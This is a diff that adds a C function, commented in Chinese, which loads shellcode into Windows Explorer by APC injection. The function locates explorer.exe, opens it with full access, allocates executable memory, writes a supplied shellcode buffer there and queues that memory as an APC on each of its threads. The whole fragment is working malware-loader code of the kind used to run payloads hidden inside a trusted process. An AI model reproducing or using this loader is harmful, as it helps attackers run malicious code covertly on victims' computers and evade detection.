@@ -1,0 +1,45 @@
+// APC注入加载方式：向目标进程（explorer.exe）注入APC
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] APC注入方式执行Shellcode\n");
+#endif
+    // 查找目标进程（explorer.exe）
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
+    if (!Process32First(snapshot, &processEntry)) return;
+    
+    DWORD targetPID = 0;
+    while (_stricmp(processEntry.szExeFile, "explorer.exe") != 0) {
+        if (!Process32Next(snapshot, &processEntry)) break;
+    }
+    targetPID = processEntry.th32ProcessID;
+    CloseHandle(snapshot);
+    if (targetPID == 0) return;
+
+    // 打开进程并分配内存
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        CloseHandle(hProcess);
+        return;
+    }
+    
+    // 写入Shellcode并队列APC
+    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);
+    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+    if (Thread32First(hThreadSnap, &threadEntry)) {
+        do {
+            if (threadEntry.th32OwnerProcessID == targetPID) {
+                HANDLE hTargetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+                if (hTargetThread) {
+                    QueueUserAPC((PAPCFUNC)remoteMem, hTargetThread, (ULONG_PTR)0);
+                    CloseHandle(hTargetThread);
+                }
+            }
+        } while (Thread32Next(hThreadSnap, &threadEntry));
+    }
+    
+    CloseHandle(hThreadSnap);
+    CloseHandle(hProcess);
+}
